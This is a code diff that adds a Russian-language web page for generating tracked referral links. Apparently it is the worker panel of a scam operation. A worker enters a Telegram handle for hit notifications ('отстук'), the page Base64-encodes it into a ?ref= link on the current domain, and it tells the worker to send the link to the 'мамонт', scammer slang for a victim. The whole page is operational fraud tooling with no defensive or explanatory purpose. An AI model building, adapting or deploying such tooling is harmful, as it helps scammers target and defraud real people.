@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Создание ссылки</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+        }
+        .panel-container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        .panel-container:hover {
+            transform: translateY(-5px);
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 16px;
+            color: #555;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            color: #333;
+            outline: none;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        input:focus {
+            border-color: #667eea;
+            box-shadow: 0 0 8px rgba(102, 126, 234, 0.3);
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #667eea;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+        button:hover {
+            background: #764ba2;
+            transform: translateY(-2px);
+        }
+        button:active {
+            transform: translateY(0);
+        }
+        #result {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #333;
+            word-break: break-all;
+        }
+        #result a {
+            color: #667eea;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        #result a:hover {
+            text-decoration: underline;
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        .domain-info {
+            font-size: 12px;
+            color: #777;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="panel-container">
+        <h1>Создание ссылки</h1>
+        <form id="workerForm">
+            <div class="form-group">
+                <label for="nick">Введи свой никнейм телеграм для отстука через @:</label>
+                <input type="text" id="nick" placeholder="@mynick" required>
+                <div class="error-message" id="error-message"></div>
+                <div class="domain-info">Текущий домен: <strong id="current-domain"></strong></div>
+            </div>
+            <button type="submit">Сгенерировать ссылку</button>
+        </form>
+        <div id="result"></div>
+    </div>
+
+    <script>
+        document.getElementById('current-domain').textContent = window.location.origin;
+        document.getElementById('workerForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const nickInput = document.getElementById('nick').value.trim();
+            const errorMessage = document.getElementById('error-message');
+            errorMessage.style.display = 'none';
+
+            // Проверяем, что ник начинается с @
+            if (!nickInput.startsWith('@') || nickInput.length < 2) {
+                errorMessage.textContent = 'Ник должен начинаться с @ и содержать хотя бы 1 символ после него';
+                errorMessage.style.display = 'block';
+                return;
+            }
+
+            // Удаляем @ для кодирования
+            const nick = nickInput.substring(1);
+            let refCode;
+            try {
+                refCode = btoa(nick); // Кодируем ник в Base64
+            } catch (e) {
+                errorMessage.textContent = 'Ошибка: используй только латинские буквы, цифры или символы Telegram-ника';
+                errorMessage.style.display = 'block';
+                return;
+            }
+
+            const currentDomain = window.location.origin; // Динамический домен
+            const refLink = `${currentDomain}/?ref=${encodeURIComponent(refCode)}`;
+            document.getElementById('result').innerHTML = `Твоя уникальная ссылка: <br><strong><a href="${refLink}" target="_blank">${refLink}</a></strong><br><br>Пришли ее мамонту!`;
+        });
+    </script>
+</body>
+</html>
